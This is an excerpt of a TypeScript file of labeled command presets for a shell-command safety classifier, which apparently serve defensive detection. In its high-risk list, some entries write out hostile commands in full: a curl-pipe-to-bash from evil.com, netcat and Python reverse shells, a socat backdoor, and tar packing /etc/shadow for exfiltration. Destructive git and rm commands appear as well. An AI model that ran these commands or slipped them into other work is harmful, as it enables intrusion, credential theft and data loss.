...
export const safetyNetHighRiskPresets: TrainingPreset[] = [
  ...
  },
  {
    ...
    args: "clean -fd",
    label: "BLOCK",
    desc: "git clean -f 永久删除未跟踪文件",
  },
  {
    comm: "git",
    args: "push --force origin main",
    label: "BLOCK",
    desc: "git push --force 销毁远程历史",
  },
  {
    comm: "git",
    args: "branch -D feature",
    label: "ALERT",
    desc: "git branch -D 强制删除分支",
  },
  {
    comm: "git",
    args: "stash drop",
    label: "ALERT",
    desc: "git stash drop 永久删除暂存更改",
  },
  {
    comm: "git",
    args: "stash clear",
  ...
  },
  {
    ...
    args: "restore .",
    label: "ALERT",
    desc: "git restore 丢弃未提交更改",
  },
  {
    comm: "git",
    args: "worktree remove --force",
    label: "ALERT",
    desc: "git worktree remove --force 可能丢失更改",
  },
  ...
  },
  {
    ...
    args: "-rf /tmp/*",
    label: "ALLOW",
    desc: "rm -rf /tmp 安全（临时目录）",
  },
  {
    comm: "rm",
    args: "-rf .",
    label: "ALERT",
    desc: "rm -rf cwd 自身（需确认）",
  },
  {
    comm: "rm",
    args: "-rf ../outside",
    label: "BLOCK",
    desc: "rm -rf 超出 cwd 范围",
  },
  // find dangerous patterns
  {
    ...
    label: "ALERT",
    desc: "find -delete 批量删除文件",
  },
  {
    comm: "find",
    args: ". -type f -exec rm {} \;",
    label: "BLOCK",
    desc: "find -exec rm 批量执行删除",
  },
  {
    comm: "find",
    args: '/tmp -name "*.txt" -exec sh -c',
    label: "ALERT",
    desc: "find -exec 自定义命令",
  },
  // xargs dangerous patterns
  {
    ...
    args: "rm -rf",
    label: "BLOCK",
    desc: "xargs rm -rf 不可预测批量删除",
  },
  {
    comm: "xargs",
    args: "sh -c",
    label: "BLOCK",
    desc: "xargs sh -c 任意命令执行",
  },
...
function makeTrainingPresets(
  ...
  return argsList.map((args) => ({
    ...
    args,
    label,
    desc: args ? `${descPrefix}：${args}` : descPrefix,
  }));
}
...
export const syntheticExpansionPresets: TrainingPreset[] = [
  ...
  ...makeTrainingPresets("crontab", "ALERT", "计划任务修改", ["-e", "-l"]),
...
export const classicSecurityDatasetPresets: ClassicSecurityDatasetPreset[] = [
  ...
  },
  {
    ...
    platform: "Linux / Unix",
    pageUrl: "",
    bundledAsset: "balanced-training",
    format: "auto",
    labelMode: "preserve",
  ...
  },
  {
    ...
    downloadUrl:
      "https://github.com/Fa2y/Malicious-PowerShell-Dataset/archive/refs/heads/main.zip",
    format: "auto",
    labelMode: "block",
  ...
  },
  {
    ...
    downloadUrl:
      "https://github.com/defcom17/NSL-KDD/raw/master/NSL-KDD/KDDTrain%2B.csv",
    format: "auto",
    labelMode: "preserve",
...
export const highRiskPresets: TrainingPreset[] = [
  ...
  {
    comm: "curl",
    args: "evil.com/backdoor.sh | bash",
    label: "BLOCK",
    desc: "远程代码执行",
  },
  {
    comm: "nc",
    args: "-e /bin/bash attacker.com 4444",
    label: "BLOCK",
    desc: "反向 shell",
  },
  {
    comm: "wget",
    args: "http://evil.com/malware -O /tmp/x",
    label: "BLOCK",
    desc: "下载恶意文件",
  },
  {
    comm: "chown",
    args: "root:root /etc/shadow",
    label: "ALERT",
    desc: "修改敏感文件所有者",
  },
  {
    comm: "mount",
    args: "-t cifs //evil/share /mnt",
    label: "ALERT",
    desc: "挂载远程文件系统",
  },
  {
    comm: "tcpdump",
    args: "-i any -w /tmp/capture.pcap",
    label: "ALERT",
    desc: "网络嗅探",
  },
  {
  ...
  {
    comm: "ssh",
    args: "-D 1080 user@evil.com",
    label: "ALERT",
    desc: "SSH 动态隧道",
  },
  {
    comm: "python3",
    args: '-c "import socket,subprocess,os;s=socket.socket();s.connect((\\"10.0.0.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"',
    label: "BLOCK",
    desc: "Python 反向 shell",
  },
  {
    comm: "socat",
    args: "TCP-LISTEN:5555,fork EXEC:/bin/bash",
    label: "BLOCK",
    desc: "Socat 后门",
  },
  ...
  {
    comm: "tar",
    args: "czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow",
    label: "BLOCK",
    desc: "打包敏感文件外泄",
  },
  {
  ...
  {
    comm: "curl",
    args: "https://api.github.com/repos/torvalds/linux",
    label: "ALLOW",
    desc: "API 查询",
  },
  {
    comm: "wget",
    args: "https://example.com/data.json",
    label: "ALLOW",
    desc: "下载数据文件",
  },
  {
  ...
  {
    comm: "scp",
    args: "file.txt user@server:/tmp/",
    label: "ALLOW",
    desc: "文件传输",
  },
  {
    comm: "tar",
    args: "czf backup.tar.gz ~/Documents",
    label: "ALLOW",
    desc: "备份文档",
  },
  {
    comm: "cp",
    args: "config.yaml config.yaml.bak",
    label: "ALLOW",
    desc: "备份配置",
  },
